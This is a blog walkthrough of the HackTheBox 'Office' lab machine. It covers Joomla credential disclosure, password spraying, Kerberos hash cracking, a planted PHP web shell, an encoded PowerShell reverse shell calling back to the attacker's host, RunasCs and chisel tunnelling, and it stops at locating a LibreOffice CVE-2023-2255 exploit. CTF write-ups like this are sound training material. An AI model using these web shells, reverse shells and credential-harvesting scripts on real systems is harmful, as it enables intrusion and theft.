---
title: HTB - Office
date: 2024-06-23 00:00:00 + 1000
categories: [CTF,HTB,Windows,Active Directory,LibreOffice] 
tags: [ctf,htb,cve-2023-2255,dpapi,mimikatz,winpeas, chisel, bloodhound,sharpgpoabuse]
comments: false
---

Office is a hard-rated HTB machine. I exploited an unauthenticated info disclosure vulnerability on Joomla to get the credentials. With these, I found a .pcap file in the "SOC Analysis" share containing an encrypted Kerberos password. After cracking it, I logged into Joomla as an admin and got a shell as web_account.

Logging in as "tstark", I found port 8083 listening, uploaded chisel, and forwarded the port to my machine; LibreOffice 5.2.6.2 was installed and vulnerable so, I crafted a malicious .odt, uploaded it, and got a shell as "ppotts". Using mimikatz, I decrypted DPAPI Master Keys and Credential Files, logged in as "HHogan", and used SharpGPOAbuse to add "HHogan" as a local admin.

## Common Enumeration
### Nmap
Running the nmap scan - `sudo nmap -p- -sC -sV -Pn -oA recon/allport 10.10.11.3 --open` - found the bunch of open ports

- Likely we're dealing with a Windows Domain Controller
- Domain: office.htb

```bash
$ sudo nmap -p- -sC -sV -Pn -oA recon/allport 10.10.11.3 --open                                                                        
[sudo] password for ctf:                                                                                                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-04 19:34 AEST                                                                      
Nmap scan report for 10.10.11.3                                                                                                          
Host is up (0.0085s latency).                                                                                                            
Not shown: 65515 filtered tcp ports (no-response)                                                                                        
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                                                              
PORT      STATE SERVICE       VERSION                                                                                                    
53/tcp    open  domain        Simple DNS Plus                                                                                            
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)                                                    
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28                                                                    
| http-robots.txt: 16 disallowed entries (15 shown)                                                                                      
| /joomla/administrator/ /administrator/ /api/ /bin/                                                                                     
| /cache/ /cli/ /components/ /includes/ /installation/                                                                                   
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/                                                                            
|_http-generator: Joomla! - Open Source Content Management                                                                               
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-04 17:36:43Z)                                             
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                              
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)              
|_ssl-date: 2024-06-04T17:38:13+00:00; +8h00m00s from scanner time.                                                                      
| ssl-cert: Subject: commonName=DC.office.htb                                                                                            
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb                                            
| Not valid before: 2023-05-10T12:36:58                                                                                                  
|_Not valid after:  2024-05-09T12:36:58                                                                                                  
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)                                                            
| tls-alpn:                                                                                                                              
|_  http/1.1                                                                                                                             
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28                                                                    
|_http-title: 403 Forbidden                                                                                                              
| ssl-cert: Subject: commonName=localhost                                                                                                
| Not valid before: 2009-11-10T23:48:47                                                                                                  
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-04T17:38:12+00:00; +7h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-04T17:38:13+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-04T17:38:12+00:00; +7h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
54623/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54626/tcp open  msrpc         Microsoft Windows RPC
64132/tcp open  msrpc         Microsoft Windows RPC
64135/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2024-06-04T17:37:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.93 seconds
```

### DNS - 53
I ran a zone transfer hoping to get a goldmine of information. But it was locked down tight.

```bash
 dig axfr office.htb @10.10.11.3

; <<>> DiG 9.19.21-1-Debian <<>> axfr office.htb @10.10.11.3
;; global options: +cmd
; Transfer failed.
```

Reverse lookup also came up dry

```bash
$ dig -x 10.10.11.3

; <<>> DiG 9.19.21-1-Debian <<>> -x 10.10.11.3
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 27303
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;3.11.10.10.in-addr.arpa.       IN      PTR

;; Query time: 1029 msec
;; SERVER: 172.17.192.1#53(172.17.192.1) (UDP)
;; WHEN: Tue Jun 04 19:47:50 AEST 2024
;; MSG SIZE  rcvd: 52
```

### Kerberos - 88
I use the `Kerbrute`, a nifty tool that let you brute-force usernames. My oversimplified explanation of kerbrute; it brute-forces user by analyzing error codes:

- KDC_ERR_PREAUTH_FAILED: This one, "Yep, this user exists!"
- KDC_ERR_C_PRINCIPAL_UNKNOWN: This one, "Nope, no user here!"

```bash
$ ./kerbrute userenum --dc 10.10.11.3 -d office.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/04/24 - Ronnie Flathers @ropnop

2024/06/04 19:50:41 >  Using KDC(s):
2024/06/04 19:50:41 >   10.10.11.3:88

2024/06/04 19:50:42 >  [+] VALID USERNAME:       administrator@office.htb
2024/06/04 19:50:49 >  [+] VALID USERNAME:       Administrator@office.htb
2024/06/04 19:50:52 >  [+] VALID USERNAME:       etower@office.htb
2024/06/04 19:50:52 >  [+] VALID USERNAME:       ewhite@office.htb
2024/06/04 19:50:52 >  [+] VALID USERNAME:       dwolfe@office.htb
2024/06/04 19:50:52 >  [+] VALID USERNAME:       dlanor@office.htb
2024/06/04 19:50:52 >  [+] VALID USERNAME:       dmichael@office.htb
2024/06/04 19:52:06 >  [+] VALID USERNAME:       hhogan@office.htb
2024/06/04 19:52:27 >  [+] VALID USERNAME:       DWOLFE@office.htb
2024/06/04 19:59:47 >  [+] VALID USERNAME:       tstark@office.htb
```

### SMB - 445
I use the `NetExec` tool to try and enumerate the available shares. I tried using the "guest" account, but no dice – it was disabled.

- Domain: office.htb
- Host: Windows Server 2022

```bash
$ nxc smb 10.10.11.3 -u guest -p '' --shares
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\guest: STATUS_ACCOUNT_DISABLED 
```

### LDAP - 389
I use `ldapsearch` to try to get a glimpse of the directory's structure.

```bash
$ ldapsearch -x -H ldap://10.10.11.3 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=office,DC=htb
namingcontexts: CN=Configuration,DC=office,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=office,DC=htb
namingcontexts: DC=DomainDnsZones,DC=office,DC=htb
namingcontexts: DC=ForestDnsZones,DC=office,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Without proper authentication, the search did not return any useful information

```bash
$ ldapsearch -x -H ldap://10.10.11.3 -s sub -b'DC=office,DC=htb'
# extended LDIF
#
# LDAPv3
# base <DC=office,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

## Website HTTP/HTTPS
### HTTP 80 - Joomla
Browsing the 10.10.11.3 - brings to this page. it's iron man theme website; website – it was running Joomla!

![img](/assets/img/Office/1.webp)

#### Joomla Scan
I fired up `joomscan`. It output some basic info, including the version: Joomla! v4.2.7. Not much to go on, but a quick Google search found the juicy details; this version was vulnerable to unauthenticated information disclosure. Bingo!

```bash
$ joomscan -u http://10.10.11.3
...snip...  
[+] FireWall Detector                                                                                                                    
[++] Firewall not detected          

[+] Detecting Joomla Version                                                                                                             
[++] Joomla 4.2.7                                                                                                                        
[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.11.3/administrator/components
http://10.10.11.3/administrator/modules
http://10.10.11.3/administrator/templates
http://10.10.11.3/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.11.3/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.11.3/robots.txt 
Interesting path found from robots.txt
http://10.10.11.3/joomla/administrator/
http://10.10.11.3/administrator/
http://10.10.11.3/api/
http://10.10.11.3/bin/
http://10.10.11.3/cache/
http://10.10.11.3/cli/
http://10.10.11.3/components/
http://10.10.11.3/includes/
http://10.10.11.3/installation/
http://10.10.11.3/language/
http://10.10.11.3/layouts/
http://10.10.11.3/libraries/
http://10.10.11.3/logs/
http://10.10.11.3/modules/
http://10.10.11.3/plugins/
http://10.10.11.3/tmp/

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found
```

The vulnerability exposed two endpoints:

- `/api/index.php/v1/users?public=true`: This one coughed up usernames.
- `/api/index.php/v1/config/application?public=true`: This one served up the juicy password.

I grabbed the PoC from [Exploit DB](https://www.exploit-db.com/exploits/51334) but it written in Ruby. Converted to python call it `get_cred.py`

```python
import requests

def url(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.json().get("data", [])

def attribute(data, attribute):
    for item in data:
        attributes = item.get("attributes", {})
        attribute_value = attributes.get(attribute)
        if attribute_value is not None:
            print(attribute + ":", attribute_value)

user_url = "http://office.htb/api/index.php/v1/users?public=true"
config_url = "http://office.htb/api/index.php/v1/config/application?public=true"

user = url(user_url)
attribute(user, "username")

config = url(config_url)
attribute(config, "password")
```

I ran the script to get the credential. I tried logging into the Joomla admin panel with those credentials. But... nothing

```bash
$ python3 get_cred.py 
username: Administrator
password: H0lOgrams4reTakIng0Ver754!
```

From the earlier enumeration it gave us a list of users, I used `NetExec` to spray that password across the user list

```bash
$ nxc smb 10.10.11.3 -u user.txt -p 'H0lOgrams4reTakIng0Ver754!' --no-bruteforce --continue-on-success
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\DWOLFE:H0lOgrams4reTakIng0Ver754! 
```

The credentials - `dwolfe:H0lOgrams4reTakIng0Ver754!` worked. So, I tried those credentials on Joomla again. But... still nothing

### Enumerating shares
I quickly listed the files within the "SOC Analysis" share. There were a few interesting files, but one stood out: `Latest-System-Dump-8fbc124d.pcap`

```bash
$ nxc smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -M spider_plus
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SPIDER_PLUS 10.10.11.3      445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.3      445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.3      445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.3      445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.3      445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.3      445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.3      445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis    READ            
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.10.11.3      445    DC               [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.11.3.json".
SPIDER_PLUS 10.10.11.3      445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, SOC Analysis, SYSVOL)
SPIDER_PLUS 10.10.11.3      445    DC               [*] SMB Readable Shares:  4 (IPC$, NETLOGON, SOC Analysis, SYSVOL)
SPIDER_PLUS 10.10.11.3      445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.3      445    DC               [*] Total folders found:  38
SPIDER_PLUS 10.10.11.3      445    DC               [*] Total files found:    11
SPIDER_PLUS 10.10.11.3      445    DC               [*] File size average:    122.63 KB
SPIDER_PLUS 10.10.11.3      445    DC               [*] File size min:        23 B
SPIDER_PLUS 10.10.11.3      445    DC               [*] File size max:        1.31 MB
```

Inside the SOC Analysis there was the `Latest-System-Dump-8fbc124d.pcap`

```bash
{                                                                                                                                        
  "NETLOGON": {},                                                                                                                        
  "SOC Analysis": {                                                                                                                      
    "Latest-System-Dump-8fbc124d.pcap": {                                                                                                
      "atime_epoch": "2023-05-08 10:59:54",                                                                                              
      "ctime_epoch": "2023-05-08 10:59:54",                                                                                              
      "mtime_epoch": "2023-05-11 04:51:42",                                                                                              
      "size": "1.31 MB"                                                                                                                  
    }                                                                                                                                    
  },                                                                                                                                     
  "SYSVOL": {                                                                                                                            
    "office.htb/Policies/{04FE5C75-0078-4D44-97C5-8A796BE906EC}/GPT.INI": {                                                              
      "atime_epoch": "2023-05-11 02:47:27",                                                                                              
      "ctime_epoch": "2023-05-11 02:47:27",                                                                                              
      "mtime_epoch": "2023-05-11 02:47:27",                                                                                              
      "size": "59 B" 

...snip... 
```

I have downloaded the `Latest-System-Dump-8fbc124d.pcap`

```bash
$ smbclient '//10.10.11.3/SOC Analysis' -U 'dwolfe%H0lOgrams4reTakIng0Ver754!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 11 04:52:24 2023
  ..                                DHS        0  Wed Feb 14 21:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 10:59:00 2023

6265599 blocks of size 4096. 948333 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (5406.0 KiloBytes/sec) (average 5406.0 KiloBytes/sec)
smb: \> 
```

### Wireshark 
Looking into the Protocol hierarchy, there are two Kerberos packets

![img](/assets/img/Office/2.webp)

Filtering by Kerberos, I found an encrypted password!

Cipher: `a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc`

![img](/assets/img/Office/3.webp)

I throw that cipher into Hashcat after a few moments, it spit out the password: `playboy69`

```bash
Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386
f5fc:playboy69

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c56...86f5fc
Time.Started.....: Mon Jun 10 13:42:28 2024, (1 sec)
Time.Estimated...: Mon Jun 10 13:42:29 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    13648 H/s (9.09ms) @ Accel:512 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3968-4095
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> whitetiger

Started: Mon Jun 10 13:42:26 2024
Stopped: Mon Jun 10 13:42:30 2024
```

## Initial Access
I tried logging into Joomla with those credentials and… it worked!

![img](/assets/img/Office/4.webp)

Now, the real fun began. I have added PHP script under `System > /templates/cassiopeia/error.php`

```php
<?php system($_REQUEST['cmd']) ?>
```

It's running as `web_account`

```bash
$ curl http://10.10.11.3/templates/cassiopeia/error.php?cmd=whoami -s
office\web_account
```

I had a shell, as `web_account` user

```bash
$ curl http://10.10.11.3/templates/cassiopeia/error.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D 

$ rlwrap -cAr nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.3] 62733

PS C:\xampp\htdocs\joomla\templates\cassiopeia> whoami
office\web_account
PS C:\xampp\htdocs\joomla\templates\cassiopeia> 
```

### Shell web_account
`configuration.php` - It stores all the configuration settings, including database credentials and other juicy bits

```bash
PS C:\xampp\htdocs\joomla> type configuration.php                                                                       
<?php                                                                                                                                    
class JConfig {                                                                                                                          
        public $offline = false;                                                                                                         
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';                                 
        public $display_offline_message = 1;                                                                                             
        public $offline_image = '';                                                                                                      
        public $sitename = 'Holography Industries';                                                                                      
        public $editor = 'tinymce';                                                                                                      
        public $captcha = '0';                                                                                                           
        public $list_limit = 20;                                                                                                         
        public $access = 1;                                                                                                              
        public $debug = false;                                                                                                           
        public $debug_lang = false;                                                                                                      
        public $debug_lang_const = true;                                                                                                 
        public $dbtype = 'mysqli';                                                                                                       
        public $host = 'localhost';                                                                                                      
        public $user = 'root';                                                                                                           
        public $password = 'H0lOgrams4reTakIng0Ver754!';                                                                                 
        public $db = 'joomla_db';                                                                                                        
        public $dbprefix = 'if2tx_';                                                                                                     
        public $dbencryption = 0;                                                                                                        
        public $dbsslverifyservercert = false;                                                                                           
        public $dbsslkey = '';                                                                                                           
        public $dbsslcert = '';                                                                                                          
        public $dbsslca = '';                                                                                                            
        public $dbsslcipher = '';                                                                                                        
        public $force_ssl = 0;                                                                                                           
        public $live_site = '';                                                                                                          
        public $secret = 'HW1uCFFJuBcloACa';                                                                                             
        public $gzip = false;                                                                                                            
        public $error_reporting = 'default';
....snip....
```

I ran `net user` to enumerate users and there was `tstark` I had its password from earlier Kerberos adventure!

```bash
PS C:\xampp\webdav> net user

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            dlanor                   dmichael                 
dwolfe                   etower                   EWhite                   
Guest                    HHogan                   krbtgt                   
PPotts                   tstark                   web_account              
The command completed successfully.
```

I uploaded `RunasCs.exe` and ran it with the `tstark` credentials

```bash
PS C:\programdata> .\RunasCs.exe tstark playboy69 whoami
[*] Warning: The logon for user 'tstark' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

office\tstark

PS C:\programdata> .\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.6:1337
```

### Shell as tstark
With the shell as `tstark` I grep the user.txt from - `C:\Users\tstark\Desktop` directory

```bash
$ rlwrap -cAr nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.3] 62965
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
office\tstark

C:\Windows\system32>
```

And here is the user.txt!

```text
a3d593....
```

### Bloodhound
I fired up Bloodhound to collect AD data to identify the attack paths

```bash
$ bloodhound-python -u tstark -p 'playboy69' -d office.htb -ns 10.10.11.3 -c all
INFO: Found AD domain: office.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.office.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.office.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 13 users
INFO: Found 54 groups
INFO: Found 8 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.office.htb
INFO: Done in 00M 01S
```

After feeding Bloodhound some juicy AD data, user `HHogan` stood out this user had the GenericWrite permission

## Enumerating for Privilege escalation
### Shell as ppotts
With the `tstark` has the limited access. I checked the `tstark` directory for anything interesting. The only thing was the user.txt. However, I ran `netstat -an` to list listening ports; `port:8083` looks promising

```bash
PS C:\Users\tstark\Downloads> netstat -an                                                                                                
netstat -an                                                                                                                              
Active Connections
Proto  Local Address          Foreign Address        State
TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING
TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
....snip...
```

This port was inaccessible directly. I uploaded `chisel.exe`, a tool for setting up reverse proxie, I have forward `8083` port back to my machine:

- Attacker Machine: `./chisel_linux server -p 8001 -reverse`
- Target Machine: `./chisel.exe client 10.10.14.4:8001 R:8083:127.0.0.1:8083`

#### Uploading Odt
Once I had the port forwarded, I navigated to http://127.0.0.1:8083 - The home page loaded as below

![img](/assets/img/Office/7.webp)

I skimmed through the content, but nothing immediately jumped out, However, there was an email at the bottom of the page: `HolographyTech@HolographyTechnologies.htb`

![img](/assets/img/Office/8.webp)

#### Job Application Submission
The website had a simple "Submit Application" form it allowed the file upload

![img](/assets/img/Office/9.webp)

But the accepted file types were limited to .doc, .docx, .docm, and .odt

![img](/assets/img/Office/10.webp)

A quick look at the installed applications gives a clue – LibreOffice version `5.2.6.2` was installed

```bash
PS C:\programdata> Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version

Name                                                           Version         
----                                                           -------         
Office 16 Click-to-Run Extensibility Component                 16.0.17126.20132
Office 16 Click-to-Run Licensing Component                     16.0.17126.20132
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31332    14.32.31332     
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31332 14.32.31332     
LibreOffice 5.2.6.2                                            5.2.6.2         
DefaultPackMSI                                                 4.6.2.0         
VMware Tools                                                   12.0.6.20104755 
Teams Machine-Wide Installer                                   1.5.0.30767     
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133 14.29.30133     
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133    14.29.30133     
Microsoft Search in Bing                                       2.0.2           
```

A quick Google search led me to a PoC exploit for CVE-2023-2255 on GitHub - [elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255)

![img](/assets/img/Office/11.webp)

